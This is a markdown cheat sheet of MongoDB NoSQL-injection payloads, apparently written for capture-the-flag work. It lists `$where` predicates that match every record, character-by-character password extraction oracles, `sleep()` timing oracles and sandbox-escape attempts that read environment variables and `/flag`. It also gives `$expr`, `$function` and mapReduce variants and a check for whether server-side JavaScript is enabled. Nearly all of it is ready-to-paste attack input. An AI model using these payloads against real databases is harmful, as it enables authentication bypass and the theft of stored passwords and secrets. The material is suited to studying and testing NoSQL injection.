# `$where` / JS operators — the JavaScript predicates

## The `$where` — the JS-predicate

```json
{"user": {"$where": "this.user == 'admin'"}}
{"user": {"$where": "1==1"}}
{"user": {"$where": "true"}}
```

`$where` runs a JS expression per-document — needs `enableJs: true` on
the server — Atlas/most modern configs disable it — `mongo-specific.md`.

## The `this` — the document

```javascript
this.user       — the doc's user field
this.pass       — the doc's pass field
this.flag       — the doc's flag field
this._id        — the doc's _id
this[Object.keys(this)[0]]  — the first field
```

`this` — the current document — the field-access.

## The extraction predicates — the JS-oracles

```json
{"user": {"$where": "this.pass[0] == 'f'"}}
{"user": {"$where": "this.pass[1] == 'l'"}}
{"user": {"$where": "this.pass.length == 20"}}
{"user": {"$where": "this.pass.length > 10"}}
{"user": {"$where": "this.pass.charCodeAt(0) == 102"}}
{"user": {"$where": "this.pass.charCodeAt(0) > 100"}}
{"user": {"$where": "this.pass.startsWith('f')"}}
{"user": {"$where": "this.pass.startsWith('flag')"}}
{"user": {"$where": "this.pass.endsWith('}')"}}
{"user": {"$where": "this.pass.indexOf('{') == 4"}}
{"user": {"$where": "this.pass.match(/^f/)"}}
{"user": {"$where": "this.pass.match(/^flag\\{/)"}}
{"user": {"$where": "this.pass.substr(0, 4) == 'flag'"}}
{"user": {"$where": "this.pass.substring(0, 4) == 'flag'"}}
{"user": {"$where": "this.pass.slice(0, 4) == 'flag'"}}
```

The JS-predicate extraction — `extraction.md`.

## The timing — `sleep()` inside `$where`

```json
{"user": {"$where": "sleep(5000) || true"}}
{"user": {"$where": "sleep(5000)"}}
{"user": {"$where": "this.pass[0] == 'f' ? sleep(3000) : true"}}
{"user": {"$where": "if (this.pass[0] == 'f') sleep(3000); true"}}
{"user": {"$where": "this.pass[0] == 'f' && sleep(3000)"}}
```

`sleep()` — the timing-oracle — the char-by-char timing-extraction —
`detection.md`.

## The RCE-adjacent — the dangerous JS

```json
{"user": {"$where": "this.constructor.constructor('return process')().env"}}
{"user": {"$where": "global.process"}}
{"user": {"$where": "require('fs').readFileSync('/flag')"}}
```

The server-side JS context is sandboxed — `require`/`process`/`global`
are usually absent — the sandbox-escape is rare — `common-mistakes.md`.

## The `$expr` alternative — the aggregation-operators

```json
{"$expr": {"$regexMatch": {"input": "$pass", "regex": "^a"}}}
{"$expr": {"$eq": [{"$substr": ["$pass", 0, 1]}, "f"]}}
{"$expr": {"$eq": [{"$strLenCP": "$pass"}, 20]}}
{"$expr": {"$eq": [{"$indexOfCP": ["$pass", "{"]}, 4]}}
{"$expr": {"$eq": [{"$toUpper": "$pass"}, "FLAG{X}"]}}
{"$expr": {"$eq": [{"$toLower": "$pass"}, "flag{x}"]}}
{"$expr": {"$gt": [{"$strLenCP": "$pass"}, 10]}}
{"$expr": {"$eq": [{"$substrCP": ["$pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$strcasecmp": ["$pass", "flag{x}"]}, 0]}}
{"$expr": {"$eq": [{"$indexOfBytes": ["$pass", "{"]}, 4]}}
```

`$expr` — the aggregation-operators inside `find()` — always available —
the `$where` alternative — `aggregation.md`.

## The `$function` — the explicit JS-function

```json
[{"$addFields": {"x": {"$function": {
  "body": "function(pass) { return pass.startsWith('f'); }",
  "args": ["$pass"],
  "lang": "js"
}}}}]
```

`$function` — the explicit JS — needs `enableJs` — `aggregation.md`.

## The `$accumulator` — the accumulation-JS

```json
[{"$group": {"_id": null, "x": {"$accumulator": {
  "init": "function() {}",
  "accumulate": "function(state, doc) {}",
  "accumulateArgs": ["$pass"],
  "merge": "function(s1, s2) {}",
  "lang": "js"
}}}}]
```

`$accumulator` — the aggregation-JS — `aggregation.md`.

## The `mapReduce` — the legacy-JS

```javascript
db.users.mapReduce(
  "function() { emit(this.user, this.pass); }",
  "function(k, v) { return v; }"
)
```

`mapReduce` — the legacy map-reduce — JS — needs `enableJs`.

## The detection — is `enableJs` on?

```json
{"user": {"$where": "true"}}
```

If `$where` returns results → `enableJs` on — if `MongoServerError:
$where is not allowed` → `enableJs` off → use `$expr` — `detection.md`.
